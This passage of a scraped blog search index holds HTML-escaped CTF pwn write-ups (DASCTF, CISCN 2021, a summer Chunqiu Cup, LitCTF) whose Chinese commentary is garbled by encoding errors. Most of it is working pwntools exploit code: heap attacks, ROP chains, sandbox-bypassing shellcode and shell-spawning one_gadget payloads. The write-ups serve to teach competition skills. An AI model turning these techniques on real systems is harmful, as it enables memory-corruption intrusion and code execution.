p.sendlineafter(&amp;quot;keyword\n&amp;quot;,payload)

p.sendafter(&amp;quot;keyword\n&amp;quot;,&amp;quot;/bin/sh\x00&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;magicbook&#34;&gt;magicbook&lt;/h1&gt;
&lt;p&gt;ç”¨Largebin attackä¿®æ”¹è¯»å…¥çš„æ•°æ®é•¿åº¦ï¼Œå¼€äº†æ²™ç›’ç¦ç”¨äº†execveï¼Œå°±æ˜¯ä¸ªæ ˆæº¢å‡ºæ‰“orw&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

r = process(&amp;quot;./pwn&amp;quot;)
# p = remote(&#39;node5.buuoj.cn&#39;,27012)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = elf.libc

def choice(cmd):
	r.sendlineafter(&amp;quot;choice:\n&amp;quot;,str(cmd).encode())

def add(size):
    choice(1)
    r.recvuntil(b&#39;need?\n&#39;)
    r.sendline(str(size).encode())


def delete(idx,content = b&#39;&#39;,flag = -1):
    choice(2)
    r.recvuntil(b&#39;delete?\n&#39;)
    r.sendline(str(idx).encode())
    if(flag==-1):
    	r.sendlineafter(&amp;quot;deleted?(y/n)\n&amp;quot;,b&#39;n&#39;)
    else:
    	r.sendlineafter(&amp;quot;deleted?(y/n)\n&amp;quot;,b&#39;y&#39;)
    	r.sendlineafter(&amp;quot;write?\n&amp;quot;,b&#39;0&#39;)
    	r.sendlineafter(&amp;quot;content: \n&amp;quot;,content)


def edit(pay):
    choice(3)
    r.recvuntil(b&#39;story!\n&#39;)
    r.sendline(pay)

r.recvuntil(b&#39;gift: &#39;)

book = int(r.recv(14),16) - 0x4010 + 0x4050
add(0x460)#0
add(0x20)#1
add(0x450)#2

delete(0)
add(0x500)#3

pay = p64(0xff)*2 + p64(book - 0x20)
delete(2,pay,0)

add(0x500)#4
print(&amp;quot;book = &amp;quot;,hex(book))

bss_base = book - 16464
bss = book + 0x600

# ----------------------------------------------------
puts_plt = bss_base + 0x000000000001140
puts_got = bss_base + 0x000000000003F88
main_addr = bss_base + 0x0000000000015F9
rdi_ret = bss_base + 0x0000000000001863
rsi_r15_ret = bss_base + 0x0000000000001861
vuln = bss_base + 0x15E6


payload1 = b&#39;a&#39;*0x28 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
edit(payload1)
libc.address = u64(r.recv(6).ljust(8,b&#39;\x00&#39;))-libc.symbols[&#39;puts&#39;]
print(&#39;libc:&#39;,hex(libc.address))
rdx_r12_ret = libc.address+0x000000000011f2e7
# gdb.attach(r)
payload2 = b&#39;a&#39;*0x28 + p64(rdi_ret) + p64(0) + p64(rsi_r15_ret) + p64(bss)*2 + p64(rdx_r12_ret) + p64(0x100)*2 + p64(libc.symbols[&#39;read&#39;])
payload2 += p64(rdi_ret) + p64(bss) + p64(rsi_r15_ret) + p64(0)*2 + p64(rdx_r12_ret) + p64(0)*2 + p64(libc.symbols[&#39;open&#39;])
payload2 += p64(rdi_ret) + p64(3) + p64(rsi_r15_ret) + p64(bss)*2 + p64(rdx_r12_ret) + p64(0x100)*2 + p64(libc.symbols[&#39;read&#39;])
payload2 += p64(rdi_ret) + p64(bss) + p64(libc.symbols[&#39;puts&#39;])
r.send(payload2)
r.send(&#39;./flag\x00&#39;)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DASCTF 2024æš‘æœŸæŒ‘æˆ˜èµ›</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ciscn_2021_silverwolf/"" data-c="
          &lt;p&gt;2.27çš„libcï¼Œå¼€äº†æ²™ç›’å¾—æ‰“orwï¼Œç¨‹åºå­˜åœ¨uafæ¼æ´ï¼Œåªèƒ½å¯¹ä¸€ä¸ªchunkè¿›è¡Œæ“ä½œï¼Œå¹¶ä¸”è¿˜æœ‰å¤§å°é™åˆ¶ï¼Œä¸èƒ½è¶…è¿‡0x78ï¼Œæ”»å‡»æ€è·¯ï¼š&lt;/p&gt;
&lt;p&gt;1.æ³„éœ²libcå’ŒheapåŸºåœ°å€:ç”±äºæœ‰å¤§å°é™åˆ¶ï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒtcache_perthread_struct ç»“æ„ä½“ï¼ŒæŠŠ0x250å¤§å°çš„countä¿®æ”¹ä¸º7ï¼Œé‡Šæ”¾åŠ«æŒåˆ°è¯¥ç»“æ„ä½“çš„chunkåˆ°unsortedbinsï¼Œä»è€Œæ³„éœ²libcåŸºåœ°å€&lt;br&gt;
2.åŠ«æŒtcache_perthread_struct ç»“æ„ä½“ï¼Œåœ¨å †ä¸­å¸ƒç½®orwçš„ROPchainå’Œflagå­—ç¬¦ä¸²&lt;br&gt;
3.åŠ«æŒfree hookä¸ºsetcontext+53ï¼Œä»è€Œæ§åˆ¶rspåˆ°å¸ƒç½®çš„orwä¸Šï¼ˆsetcontextæ„Ÿè§‰å°±ç›¸å½“äºå¸ƒç½®rspçš„å€¼ç„¶åretï¼Œä»è€Œå®ç°æ§åˆ¶æ‰§è¡Œæµï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
import sys
import os
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

io = process(&#39;./pwn&#39;)
# io = remote(&#39;node4.anna.nssctf.cn&#39;,28025)
libc = ELF(&#39;libc-2.27.so&#39;)


def choice(idx):
    io.recvuntil(b&#39;choice: &#39;)
    io.sendline(str(idx))


def add(size):
    choice(1)
    io.sendlineafter(b&#39;Index: &#39;, str(0))
    io.sendlineafter(b&#39;Size: &#39;, str(size))


def edit(content):
    choice(2)
    io.sendlineafter(b&#39;Index: &#39;, str(0))
    io.sendlineafter(b&#39;Content: &#39;, content)


def free():
    choice(4)
    io.sendlineafter(b&#39;Index: &#39;, str(0))


def show():
    choice(3)
    io.sendlineafter(b&#39;Index: &#39;, str(0))
# æ³„éœ²libc,heap
add(0x78)
free()
show()
heap_base = u64(io.recvuntil(b&#39;\x55&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 4512
print(&#39;heap_base&#39;,hex(heap_base))
tcache = heap_base
edit(p64(tcache))
add(0x78)
add(0x78)
edit(p64(0)*4 + b&#39;\x00&#39;*3 + b&#39;\x07&#39;)
free()
show()
libc_base = u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 4111520
print(&#39;libc_base&#39;,hex(libc_base))
edit(p64(0)*4 + b&#39;\x00&#39;*4)
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
flag_addr = heap_base + 0x1000

orw1 = heap_base + 0x3000
orw2 = heap_base + 0x3060

stack_pivot_1 = heap_base + 0x2000
stack_pivot_2 = heap_base + 0x20A0

payload = b&#39;\x00&#39; * 0x40
payload += p64(free_hook)  # 0x20
payload += p64(0)
payload += p64(flag_addr)
payload += p64(stack_pivot_1)
payload += p64(stack_pivot_2)
payload += p64(orw1)
payload += p64(orw2)

edit(payload)
# orw
# Open

orw = p64(pop_rdi) + p64(flag_addr)
orw += p64(pop_rax) + p64(2)
orw += p64(pop_rsi) + p64(0)
orw += p64(syscall) # open(&#39;./flag&#39;)

# Read

orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw1)
orw += p64(pop_rdx) + p64(0x30)
orw += p64(read) # read(3, orw1, 0x30)

# Write

orw += p64(pop_rdi) + p64(1)
orw += p64(write) # write(1, orw1, 0x30)

add(0x18)
edit(p64(setcontext))
add(0x38)
edit(&#39;./flag&#39;)
add(0x68)
edit(orw[:0x60])
add(0x78)
edit(orw[0x60:])
add(0x58)
edit(p64(orw1) + p64(ret))
add(0x48)
free()

gdb.attach(io)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">CISCN_2021_silverwolf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/chun-qiu-bei-xia-ji-sai/"" data-c="
          &lt;h1 id=&#34;shuffled_execution&#34;&gt;Shuffled_Execution&lt;/h1&gt;
&lt;p&gt;å°±æ˜¯å†™ä¸ªshehllcodeï¼Œä½†æ˜¯æœ‰ä¸ªéšæœºäº¤æ¢å­—èŠ‚ï¼Œå¯ä»¥åœ¨å‰é¢è¾“å…¥0x00ç»•è¿‡strlenä»è€Œç»•è¿‡éšæœºäº¤æ¢ï¼Œåé¢å°±æ˜¯æ²™ç›’orwï¼Œ&lt;img src=&#34;https://l1u66.github.io//post-images/1720350450536.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç”¨openatï¼Œmmap/preadv2 ï¼Œwritevç»•è¿‡&lt;br&gt;
&lt;code&gt;preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0)&lt;/code&gt;&lt;br&gt;
ç¬¬äºŒä¸ªå‚æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«ç€å†™å…¥åœ°å€å’Œè¯»å–é•¿åº¦ï¼Œå°±ç›¸å½“äºåŸæ¥readçš„äºŒå‚å’Œä¸‰å‚&lt;br&gt;
&lt;code&gt;writev(fd=1, iovec=0x1337090, count=1)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
import ctypes
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
	
# r = remote(&amp;quot;8.147.132.12&amp;quot;,42557)
r = process(&amp;quot;./vuln&amp;quot;)
gdb.attach(r)

p = b&#39;\x00PP&#39;
shellcode = asm(&#39;&#39;&#39;
		/* openat(fd=-0x64, file=&#39;flag&#39;, oflag=0) */
        add rax, 0x62
        mov r12, rax
        mov rsi, rax
        mov rdi, -0x64
        /* call openat() */
        mov rax, 0x101 /* 0x101 */
        syscall
        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */
        mov rdi, 3
        mov rdx, 0x1
        add r12, 0x15
        mov rsi, r12
        /* call preadv2() */
        mov rax, 327
        syscall
        /* writev(fd=1, iovec=0x1337090, count=1) */
        mov rdi, 1
        mov rdx, 0x1
        /* call writev() */
        mov rax, 0x14
        syscall
&#39;&#39;&#39;)

p += shellcode + b&#39;\x00&#39; * 0x10 + b&#39;flag\x00&#39; + b&#39;\x00&#39; * 0x10 + p64(0x1337090) + p64(0x100)
r.sendlineafter(b&#39;entrance&#39;, p)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸‹é¢æ˜¯ç”¨çš„æµ‹ä¿¡é“ä»£æ›¿çš„writeï¼Œä½†æ˜¯è¿œç«¯è¿æ¥å¯èƒ½ä¸å¤ªç¨³å®šï¼Œä¸€ç›´æ²¡é€šï¼ˆæ¯”èµ›çš„æ—¶å€™ä¸çŸ¥æœ‰writevå‡½æ•°ï¼Œæ‚²ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#openat(0xffffff9c,flag,0)
#pread(3,0x114514000,0x100,0)

payload = asm(&#39;&#39;&#39;
	mov rbp,0x1337800
	mov rsp,rbp
	&#39;&#39;&#39;)
payload += asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))
payload += asm(shellcraft.mmap(0x1337000,0x100,1,1,&#39;eax&#39;,0))
payload += asm(&#39;&#39;&#39;
	mov rsi,rax
	&#39;&#39;&#39;)

def exp(dis,char):
	pay = payload	
	pay += asm(&#39;&#39;&#39;
		mov dl, byte ptr [rsi+{}]
        mov bl, {}
        cmp bl,dl
        jz loop
        mov rax,60
		mov rdi,0x0
        syscall
        loop:
        jmp loop
	&#39;&#39;&#39;.format(dis,char))
	print(len(pay))#87 
	print(pay)
	p.sendafter(&amp;quot;entrance.\n&amp;quot;,pay)
	
flag = &amp;quot;&amp;quot;
# p = remote(&amp;quot;8.147.132.12&amp;quot;,42557)
# p = process(&amp;quot;./vuln&amp;quot;)
# gdb.attach(p)
# exp(0,0)
# p.interactive()

for i in range(len(flag),50):
	sleep(1)
	print(&amp;quot;flag : {}&amp;quot;.format(flag))
	for j in range(0x20,0x80):
		# p = remote(&amp;quot;8.147.132.12&amp;quot;,42557)
		p = process(&amp;quot;./vuln&amp;quot;)
		try:
			exp(i,j)
			p.recvline(timeout=1)
			flag += chr(j)
			print(&amp;quot;flag : &amp;quot;,flag)
			log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
			p.close()
			break
		except:           
			p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;stdout&#34;&gt;stdout&lt;/h1&gt;
&lt;p&gt;è¿™ä¸å°±æ˜¯ciscn2024ä¸œåŒ—èµ›åŒºçš„åŸé¢˜ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;
è¾“å‡ºè¢«è®¾ç½®ä¸ºå…¨ç¼“å†²åŒºï¼Œåªæœ‰å½“ç¼“å†²åŒºè¢«å¡«æ»¡æ—¶æ‰ä¼šè¿›è¡ŒI/Oæ“ä½œ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void __fastcall init()
{
  setvbuf(stdout, 0LL, 0, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œä»‹ç»ä¸‹setvbufå‡½æ•°ï¼Œå®ƒæœ‰ä¸‰ç§modeï¼š&lt;br&gt;
å…¨ç¼“å†²ï¼š0ï¼Œç¼“å†²åŒºæ»¡ æˆ– è°ƒç”¨fflush() åè¾“å‡ºç¼“å†²åŒºå†…å®¹ã€‚&lt;br&gt;
è¡Œç¼“å†²ï¼š1ï¼Œç¼“å†²åŒºæ»¡ æˆ– é‡åˆ°æ¢è¡Œç¬¦ æˆ– è°ƒç”¨fflush() åè¾“å‡ºç¼“å†²åŒºå†…å®¹ã€‚&lt;br&gt;
æ— ç¼“å†²ï¼š2ï¼Œç›´æ¥è¾“å‡ºã€‚&lt;/p&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸‹æ–¹å¼è¿›è¡Œæ‰‹åŠ¨åˆ·æ–°ç¼“å†²åŒºä»è€Œè¾“å‡ºç¼“å†²åŒºä¸­çš„å†…å®¹ï¼š&lt;br&gt;
1.æ˜¾å¼è°ƒç”¨fflushå‡½æ•°&lt;br&gt;
2.æµè¢«å…³é—­ï¼ˆè°ƒç”¨fcloseï¼‰&lt;br&gt;
3.ç¨‹åºæ­£å¸¸ç»“æŸï¼ˆè°ƒç”¨exitï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__int64 extend()
{
  __int64 result; // rax
  char s[8]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v2; // [rsp+8h] [rbp-28h]
  __int64 v3; // [rsp+10h] [rbp-20h]
  __int64 v4; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+28h] [rbp-8h]
  int v6; // [rsp+2Ch] [rbp-4h]

  puts(&amp;quot;Just to increase the number of got tables&amp;quot;);
  *(_QWORD *)s = &#39;!olleh&#39;;
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v6 = strlen(s);
  if ( strcmp(s, &amp;quot;hello!&amp;quot;) )
    exit(0);
  puts(&amp;quot;hello!&amp;quot;);
  srand(1u);
  v5 = 0;
  result = (unsigned int)(rand() % 16);
  v5 = result;
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¨‹åºå…¶ä»–éƒ¨åˆ†åŒ…æ‹¬vuln extendï¼Œvulnç›®çš„æ˜¯è¿›è¡Œæ›´å¤§é•¿åº¦çš„æ ˆæº¢å‡ºï¼Œè€Œextendæ˜¯ä¸ºäº†å‘è¾“å‡ºç¼“å†²åŒºå¡«å…¥æ›´å¤šå†…å®¹åŠ å¿«å¡«æ»¡è¾“å‡ºç¼“å†²åŒºï¼Œå› ä¸ºç›´æ¥é€šè¿‡è¾“å‡ºä¸€ä¸ªåœ°å€æ¥å¡«æ»¡è¾“å‡ºç¼“å†²åŒºä¼šç”±äºè¿æ¥ä¸ç¨³å®šè€Œæ— æ³•æ‰“é€šè¿œç¨‹ï¼ˆæ‚²ï¼ŒåŒæ ·ç”±äºè¿œç«¯è¿æ¥ä¸ç¨³å®šæ²¡é€šï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
# context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
context.log_level = &#39;debug&#39;

p = process(&#39;./pwn&#39;)
# p = remote(&#39;8.147.134.120&#39;, 23067)
# elf = ELF(&#39;pwn&#39;)
# libc = ELF(&#39;libc-2.31.so&#39;)

puts_plt = 0x0000000004010B0
puts_got = 0x000000000404018
backdoor = 0x40125D
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
extend = 0x401287
ret = 0x00000000040136E

pay = b&#39;a&#39;*0x50 + p64(0xdeadbeaf) + p64(0x40125D)
p.send(pay)
# gdb.attach(p)
# leak libc
for i in range(3):#1748
   payload = b&#39;a&#39; * (0x20) + b&#39;deadbeef&#39; + p64(ret) + p64(extend) * 54 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(backdoor)
   p.send(payload)

libc_base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x875a0
p.recv()
print(&#39;libc_base = &#39; + hex(libc_base))

# ret2libc
&#39;&#39;&#39;
0xe6aee execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6af1 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6af4 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

&#39;&#39;&#39;
one_gadget = [0xe6aee, 0xe6af1, 0xe6af4]
pop_rdx_r12 = libc_base + 0x000000000011c1e1
print(hex(pop_rdx_r12))
one = libc_base + one_gadget[1]
print(hex(one))
# gdb.attach(p)
payload = b&#39;a&#39; * 0x20 + b&#39;deadbeef&#39; + p64(pop_rdx_r12) + p64(0)*2 +  p64(one)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;savetheprincess&#34;&gt;SavethePrincess&lt;/h1&gt;
&lt;p&gt;ä¸ä¼šå†™ï¼Œå¾…è¡¥å……&lt;/p&gt;
">æ˜¥ç§‹æ¯å¤å­£èµ›</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/kali-ci-pan-bu-zu-wen-ti/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41359358/article/details/138281097?spm=1001.2101.3001.6650.2&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;amp;utm_relevant_index=5&#34;&gt;ä¸€éè¿‡&lt;/a&gt;&lt;/p&gt;
">kaliç£ç›˜ä¸è¶³é—®é¢˜</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/litctf/"" data-c="
          &lt;h1 id=&#34;heap-223&#34;&gt;heap-2.23&lt;/h1&gt;
&lt;p&gt;2.23çš„libc,å­˜åœ¨uafæ¼æ´å’ŒeditåŠŸèƒ½(éƒ½æ˜¯ä¸€ä¸ªé™„ä»¶ï¼Œåªæ˜¯æ¢äº†libcç‰ˆæœ¬)è¿™é‡Œé€‰æ‹©double freeæ”¹malloc_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./heap&amp;quot;)
p = remote(&#39;node3.anna.nssctf.cn&#39;,28694)
elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;choice\n&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 3951480
onegadget = [0x4527a,0xf03a4,0xf1247]
one_gadget = base + onegadget[2]
malloc_hook = main - 88 - 0x10

print(hex(malloc_hook))
dele(2)
dele(3)
dele(2)
edit(2,p64(main - 139))
add(4,0x68)
add(5,0x68)
edit(5,b&#39;a&#39;*19 + p64(one_gadget))
print(hex(malloc_hook))
#gdb.attach(p)
add(7,0x10)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-227&#34;&gt;heap-2.27&lt;/h1&gt;
&lt;p&gt;è¿™é‡Œé€‰æ‹©tcache poisoning&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./heap&amp;quot;)
p = remote(&#39;node2.anna.nssctf.cn&#39;,28077)
#elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
#gdb.attach(p,$rebase&#39;0x178B&#39;)	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 4111520

onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
one_gadget = base + onegadget[3]
malloc_hook = main - 96 - 0x10

dele(2)
dele(3)

edit(3,p64(malloc_hook))
add(4,0x68)
add(5,0x68)
edit(5,p64(one_gadget))
print(&amp;quot;one_gadget = &amp;quot;,hex(one_gadget))
#gdb.attach(p)	
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
add(10,0x10)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-231&#34;&gt;heap-2.31&lt;/h1&gt;
&lt;p&gt;è¿™é‡Œæ‰“exit hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./heap&amp;quot;)
p = remote(&#39;node3.anna.nssctf.cn&#39;,28424)
elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
#gdb.attach(p,$rebase&#39;0x178B&#39;)	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 2018272

ld_base = base + 2236416
print(&amp;quot;ld_base = &amp;quot;,hex(ld_base))
_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
__libc_atexit = base + 0x1ED608

onegadget = [0xe3afe,0xe3b01,0xe3b04]
one_gadget = base + onegadget[0]
malloc_hook = main - 88 - 0x10
print(&amp;quot;_dl_rtld_lock_recursive = &amp;quot;,hex(_dl_rtld_lock_recursive))

dele(2)
dele(3)

edit(3,p64(_dl_rtld_lock_recursive))
add(4,0x68)
add(5,0x68)
edit(5,p64(one_gadget))
print(&amp;quot;one_gadget = &amp;quot;,hex(one_gadget))
#gdb.attach(p)	
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
exit()
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-235&#34;&gt;heap-2.35&lt;/h1&gt;
&lt;p&gt;è¯¥ç‰ˆæœ¬æ— æ³•ä½¿ç”¨hookï¼Œæ‰“å †æ ˆç»“åˆï¼Œé€šè¿‡&lt;code&gt;p &amp;amp;environ&lt;/code&gt;æ³„éœ²æ ˆåœ°å€ï¼Œç›´æ¥ç”³è¯·retåœ°å€ä¼šæœ‰å¯¹é½é”™è¯¯ï¼Œè¿™é‡Œæœ‰ptrçš„bssæ®µä¿å­˜ç€å †åœ°å€ï¼Œç”³è¯·åˆ°è¿™é‡Œç„¶åæ”¹æ‰æŒ‡é’ˆæ‰“ROP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./heap&amp;quot;)
#p = remote(&#39;node2.anna.nssctf.cn&#39;,28077)
#elf = ELF(&amp;quot;./heap&amp;quot;)

def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;size? &amp;quot;)
	p.sendline(str(size))
    
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
